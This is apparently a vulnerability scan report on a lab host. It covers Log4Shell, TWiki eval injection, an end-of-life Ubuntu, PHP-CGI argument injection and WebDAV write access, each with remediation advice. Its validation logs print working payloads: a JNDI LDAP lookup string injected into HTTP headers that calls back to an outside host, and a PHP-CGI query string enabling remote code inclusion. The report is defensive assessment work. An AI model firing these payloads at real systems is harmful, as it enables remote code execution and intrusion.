Deep Technical Vulnerability Breakdown

🔥 Apache Log4j 2.0.x Multiple Vulnerabilities (Log4Shell RCE)

Port: 8082/tcp | Protocol: HTTP | OID: 1.3.6.1.4.1.25623.1.0.117823
CRITICAL (CVSS: 10.0)

Vulnerability Insight

CVE-2021-44228 / CVE-2021-45046: Apache Log4j2 JNDI features used in log messages and parameters do not validate user input against attacker-controlled directory layers (LDAP/RMI). An attacker injecting a crafted string into any HTTP payload header triggers an external server call, executing arbitrary malicious Java bytecode inside the system execution context.

Technical Validation Log (Exploit Proof)

The scanner injected a custom string into multiple concurrent HTTP header vectors. The target engine processed the input and sent an unauthorized telemetry callback to the scanner instance:

Injected Resource Target: http://192.168.255.128:8082/ Injected Header Payloads Matrix: ├── HTTP "Accept" Header: ${jndi:ldap://192.168.255.129:29849/a} ├── HTTP "User-Agent" Header: ${jndi:ldap://192.168.255.129:29849/a} └── HTTP "X-Api-Version" Header: ${jndi:ldap://192.168.255.129:29849/a} [+] OUTBOUND CONNECTION TRIGGERED SUCCESS: ├── Destination Scanner Node: 192.168.255.129 └── Target Callback Listener Channel: 29849/tcp
🛡️ Remediation Plan: Update the embedded Apache Log4j binary architecture immediately to version 2.12.2, 2.16.0 or higher. If integration is locked down by vendor dependencies, set the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS="true" to explicitly block malicious JNDI string interpolation.

🔥 TWiki < 4.2.4 Arbitrary Code & Eval Injection Engine

Port: 8084/tcp | Software: TWiki v01.Feb.2003 | CVE-2008-5304 / 5305
CRITICAL (CVSS: 10.0)

Vulnerability Insight

The integrated TWiki platform contains systematic validation omissions. The internal %URLPARAM% syntax parameter is vulnerable to severe sanitization bypasses, enabling full Cross-Site Scripting (XSS). Furthermore, the core %SEARCH% component passes unsanitized variables straight into a native Perl eval() interpreter block, triggering a raw execution conduit for unauthorized host commands.

🛡️ Remediation Plan: Replace legacy scripts and patch the application core by updating to a stable distribution of TWiki 4.2.4 or version 4.3.2 (which patches the associated CSRF vulnerability tracked under CVE-2009-4898).

🔥 Operating System End of Life (EOL) Exposure

Port: general/tcp | OS: Canonical Ubuntu Linux 8.04 | EOL Date: 2013-05-09
CRITICAL (CVSS: 10.0)

Vulnerability Insight

The host infrastructure runs on an obsolete operating system version that has lacked vendor engineering maintenance, patch streams, and security updates for over a decade. Any newly identified kernel or network layer vulnerabilities can easily be weaponized to achieve total host compromise without remediation paths.

🛡️ Remediation Plan: Migrate host applications away from the legacy platform. Rebuild services into modern, maintained container runtimes or update the system to an active Long Term Support (LTS) kernel distribution.

⚡ PHP CGI Argument Injection & Remote Shell Deployment

Port: 8084/tcp | CVE-2012-1823 | QoD: 95%
HIGH (CVSS: 7.5)

Vulnerability Insight

When configured within CGI interfaces (e.g., Apache mod_cgid), the PHP parsing environment parses query parameters directly as executable command-line switches. This design flaw lets unauthenticated network users pass dangerous switches like -s, -d, or -c straight into the system binary, exposing application source files or executing remote PHP code arguments.

Technical Validation Log

HTTP POST Request Payload Vector: ├── Target Endpoint: http://192.168.255.128:8084/cgi-bin/php?%2D%64+allow%5Furl%5Finclude%3Don+%2D%64+safe%5Fmode%3Doff └── Dynamic Shell Body Injection: <?php phpinfo();?> [+] EXECUTED OUTPUT RESPONSE CONFIRMED: └── Engine outputs system-wide phpinfo() block (Configuration File /etc/php5/cgi)
🛡️ Remediation Plan: Update the runtime setup to PHP 5.3.13, 5.4.3 or modern engine versions. Remove legacy CGI execution routes and implement PHP-FPM for script handling.

⚡ Dangerous HTTP Configuration: Active WebDAV Write Access

Port: 8084/tcp | Service: Apache WebDAV / HTTP Method Test
HIGH (CVSS: 7.5)

Vulnerability Insight

The web server configuration permits hazardous HTTP verbs (PUT and DELETE) over unauthenticated endpoints. This misconfiguration allows malicious users to upload custom files or web shells to the storage root, or delete critical operational application files.

Technical Validation Log

[+] PUT TRANSACTION VERIFIED: └── File uploaded successfully to: http://192.168.255.128:8084/dav/puttest978255587.html [+] DELETE TRANSACTION VERIFIED: └── File purged successfully from target web root directory structure
🛡️ Remediation Plan: Modify the global Apache configuration files (httpd.conf / web.xml) to completely disable PUT and DELETE methods, or apply strict token authorization barriers inside the <Limit> directive block.
